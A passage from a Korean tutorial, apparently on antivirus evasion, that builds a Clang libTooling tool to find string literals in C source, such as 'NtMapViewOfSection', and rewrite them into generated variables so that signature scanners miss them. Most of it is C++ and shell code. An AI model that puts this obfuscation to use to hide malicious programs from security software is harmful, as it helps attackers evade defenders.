(!(ntdll = LoadLibrary(TEXT(<span class="hljs-string">&quot;ntdll&quot;</span>))))    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    lNtMapViewOfSection = (f_NtMapViewOfSection)GetProcAddress(ntdll, <span class="hljs-string">&quot;NtMapViewOfSection&quot;</span>);    lNtMapViewOfSection(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 다음 스크립트를 <code>.sh</code> 파일에 작성해라</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/headers/winsdk&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>#<span class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>는 Win32 API와 interact 하기 위해 필요한 헤더들이 있는 폴더이다. 윈도우10에서 가져왔으며 MinGW에서 가져오지 말고 필자와 같은 방법으로 하는 것을 추천한다. 그 후 테스트 C 파일을 인자로 스크립트를 실행하면 18MB 파일이 생성되지만 <code>NtMapViewOfSection</code> 같은 우리가 선언한 문자열 리터럴을 검색해서 AST에서 봐야 할 부분으로 이동할 수 있다.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png"></p><p>AST를 시각화했으므로 어떻게 노드를 업데이트해야 소스 코드의 syntax 오류가 없을지 알 수 있다. 뒷부분은 <em>libTooling</em>을 통한 AST manipulation 구현에 대해서 상세히 다룬다.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>구현을 하기 전에 boilerplate 코드가 필요하므로 다음 코드를 <code>main.cpp</code>에 입력해라.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup &#123;    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;&#125;<span class="hljs-keyword">namespace</span> StringEncryptor &#123;    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction &#123;    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>&#123;            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        &#125;        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>&#123;            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&#x27;\n&#x27;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>&#123;            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>&#123;                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        &#125;    &#125;;&#125;auto main(int argc, const char *argv[]) -&gt; int &#123;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());&#125;</code></pre><p>이 boilerplate 코드는 공식 문서에서 가져와서 설명하지 않는다. 언급할만한 변경점은 <code>CreateASTConsumer</code>이다. 우리의 목표는 같은 translation unit에서 여러 transformation pass를 수행하는 것이다. consumers collection(필수 line: <code>consumer.push_back(&amp;...);</code>)에 항목들을 추가하면 된다.</p><h2 id="문자열-난독화-1"><a href="#문자열-난독화-1" class="headerlink" title="문자열 난독화"></a>문자열 난독화</h2><p>이 부분에서는 세 가지 단계로 구성된 문자열 난독화 패스에서 가장 중요한 구현 세부 사항을 설명한다.</p><ul><li>소스 코드에 문자열 리터럴을 찾는다.</li><li>그것들을 변수로 변환한다.</li><li>적절한 위치(함수 또는 전역 context 포함)에 변수 정의/할당을 삽입</li></ul><h3 id="소스-코드에서-문자열-리터럴-찾기"><a href="#소스-코드에서-문자열-리터럴-찾기" class="headerlink" title="소스 코드에서 문자열 리터럴 찾기"></a>소스 코드에서 문자열 리터럴 찾기</h3><p><code>StringConsumer</code>는 아래와 같이 정의될 수 있다.(<code>StringEncryptor</code> namespace의 앞부분)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;&#125;;StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unit이 있으면 Clang이 AST에서 패턴을 찾을 수 있고 찾을 때마다 호출될 핸들러를 등록할 수 있다. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 강력한 패턴 매칭을 지원하지만 여기서는 문자열 리터럴만 찾으므로 충분히 활용되지 않는다.</p><p>우리는 <code>MatchHandler</code>를 구현하여 문제의 핵심을 파악할 수 있고 <code>MatchResult</code> instance를 얻을 수 있을 것이다. <code>MatchResult</code>는 식별된 AST 노드에 대한 참조와 중요한 context 정보를 포함한다.</p><p>클래스를 정의하여 <code>clang::ast_matchers::MatchFinder::MatchCallback</code>으로부터 좋은 stuff를 상속받자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback &#123;<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>&#125;;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>에서 <code>MatchHandler</code>의 생성자와 <code>run</code> 콜백 함수를 구현해야 한다. <code>MatchHandler</code>의 생성자는 나중에 사용할 <code>clang::Rewriter</code>의 instance만 저장하면 되므로 간단하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) &#123;    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;&#125;</code></pre><p><code>run</code>의 구현은 아래와 같다:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) &#123;        <span class="hljs-keyword">return</span>;    &#125;    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);&#125;</code></pre><p>위에서 짚고 넘어갈 세 가지가 있다:</p><ul><li><code>StringEncryptionConsumer</code>에서 정의된 패턴과 일치하는 AST 노드를 추출한다. 그러기 위해서 바인딩된 패턴 identifier를 인자로 문자열을 예상하는 <code>getNodeAs</code>를 호출할 수 있다.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>분석 중인 translation unit에서 정의되지 않은 문자열은 넘어간다. 실제 우리가 만든 pass는 시스템 헤더를 translation unit에 복사하는 <em>Clang</em>의 전처리기 이후에 실행된다.</li><li>이제 문자열 리터럴을 처리할 준비가 됐다. 문자열 리터럴이 어떤 context에서 발견됐는지 알아야 하므로 사용자 정의 함수에서 추출된 노드(위의 경우 <code>climbParentsIgnoreCase</code>)를 AST에 대한 참조를 포함한 <code>Result.Context</code>를 통해 전달한다. 목표는 흥미로운 노드를 찾을 때까지 위쪽의 트리를 탐색하는 것이다. 이 경우에서 흥미로운 노드는 <code>CallExpr</code> 타입이다.</li></ul><pre><code class="hljs cpp"><span class="hljs-keyword">bool</span>MatchHandler::climbParentsIgnoreCast(<span class="hljs-keyword">const</span> StringLiteral &amp;NodeString, clang::ast_type_traits::DynTypedNode node,                                     clang::ASTContext *<span class="hljs-keyword">const</span> pContext, <span class="hljs-keyword">uint64_t</span> iterations) &#123;    ASTContext::DynTypedNodeList parents = pContext-&gt;getParents(NodeString);    <span class="hljs-keyword">if</span> (iterations &gt; <span class="hljs-number">0</span>) &#123;        parents = pContext-&gt;getParents(node);    &#125;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> &amp;parent : parents) &#123;        StringRef ParentNodeKind = parent.getNodeKind().asStringRef();        <span class="hljs-keyword">if</span> (ParentNodeKind.find(<span class="hljs-string">&quot;Cast&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            <span class="hljs-keyword">return</span> climbParentsIgnoreCast(NodeString, parent, pContext, ++iterations);        &#125;        handleStringInContext(&amp;NodeString, pContext, parent);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;</code></pre><p>간단히 말해서 이 함수는 흥미로운 것(“Cast”가 아닌 것)을 찾을 때 까지 <code>StringLiteral</code> 노드의 부모 노드들을 재귀적으로 탐색한다. <code>handleStringInContext</code>는 복잡하지 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleStringInContext</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                         <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    StringRef ParentNodeKind = node.getNodeKind().asStringRef();    <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;CallExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleCallExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ParentNodeKind.compare(<span class="hljs-string">&quot;InitListExpr&quot;</span>) == <span class="hljs-number">0</span>) &#123;        handleInitListExpr(pLiteral, pContext, node);    &#125; <span class="hljs-keyword">else</span> &#123;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Unhandled context &quot;</span> &lt;&lt; ParentNodeKind &lt;&lt; <span class="hljs-string">&quot; for string &quot;</span> &lt;&lt; pLiteral-&gt;getBytes() &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;</code></pre><p>위 코드에서 눈에 띄는 건 실제로 처리되는 노드가 두 종류인 것이다. 또한 필요할 때 추가하는 게 쉬워야 한다. 실제로 두 경우 이미 비슷하게 처리되고 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *FunctionCall = node.get&lt;clang::CallExpr&gt;();    <span class="hljs-keyword">if</span> (isBlacklistedFunction(FunctionCall)) &#123;        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// exclude printf-like functions when the replacement is not constant anymore (C89 standard...).</span>    &#125;    handleExpr(pLiteral, pContext, node);&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::handleInitListExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                      <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    handleExpr(pLiteral, pContext, node);&#125;</code></pre><h3 id="문자열-리터럴-교체"><a href="#문자열-리터럴-교체" class="headerlink" title="문자열 리터럴 교체"></a>문자열 리터럴 교체</h3><p><a href="https://clang.llvm.org/doxygen/classclang_1_1CallExpr.html"><code>CallExpr</code></a>과 <a href="https://clang.llvm.org/doxygen/classclang_1_1InitListExpr.html"><code>InitListExpr</code></a>은 비슷하게 처리되므로 둘 다 사용할 수 있는 공통적인 함수를 정의한다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::handleExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                  <span class="hljs-keyword">const</span> clang::ast_type_traits::DynTypedNode node)</span> </span>&#123;    clang::SourceRange LiteralRange = clang::SourceRange(            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getBeginLoc()),            ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc())    );    <span class="hljs-keyword">if</span>(shouldAbort(pLiteral, pContext, LiteralRange))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = translateStringToIdentifier(pLiteral-&gt;getBytes().str());    <span class="hljs-keyword">if</span>(!insertVariableDeclaration(pLiteral, pContext, LiteralRange, Replacement))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span> ;    Globs::PatchedSourceLocation.push_back(LiteralRange);    <span class="hljs-keyword">return</span> replaceStringLiteral(pLiteral, pContext, LiteralRange, Replacement);&#125;</code></pre><ul><li>변수명을 무작위로 생성한다.</li><li>가까운 위치에서 빈 공간을 찾고 변수 선언을 삽입해라. 이것은 기본적으로 <code>ASTRewriter→InsertText()</code>를 둘러싼 wrapper이다.</li><li>1단계에서 생성된 identifier를 가진 문자열을 바꾼다.</li><li>collection에 문자열 리터럴의 위치를 추가한다. 이는 <code>InitListExpr</code>를 지날 때 같은 문자열 리터럴을 두 번 표시해주므로 유용하다.(이유는 알 수 없다).</li></ul><p>마지막 단계는 실제 구현이 어렵기 때문에 먼저 보자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">MatchHandler::replaceStringLiteral</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::StringLiteral *pLiteral, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        clang::SourceRange LiteralRange,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; Replacement)</span> </span>&#123;    <span class="hljs-comment">// handle &quot;TEXT&quot; macro argument, for instance LoadLibrary(TEXT(&quot;ntdll&quot;));</span>    <span class="hljs-keyword">bool</span> isMacro = ASTRewriter-&gt;getSourceMgr().isMacroBodyExpansion(pLiteral-&gt;getBeginLoc());    <span class="hljs-keyword">if</span> (isMacro) &#123;        StringRef OrigText = clang::Lexer::getSourceText(CharSourceRange(pLiteral-&gt;getSourceRange(), <span class="hljs-literal">true</span>),                                                         pContext-&gt;getSourceManager(), pContext-&gt;getLangOpts());        <span class="hljs-comment">// weird bug with TEXT Macro / other macros...there must be a proper way to do this.</span>        <span class="hljs-keyword">if</span> (OrigText.find(<span class="hljs-string">&quot;TEXT&quot;</span>) != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;            ASTRewriter-&gt;RemoveText(LiteralRange);            LiteralRange.setEnd(ASTRewriter-&gt;getSourceMgr().getFileLoc(pLiteral-&gt;getEndLoc().getLocWithOffset(<span class="hljs-number">-1</span>)));        &#125;    &#125;    <span class="hljs-keyword">return</span> ASTRewriter-&gt;ReplaceText(LiteralRange, 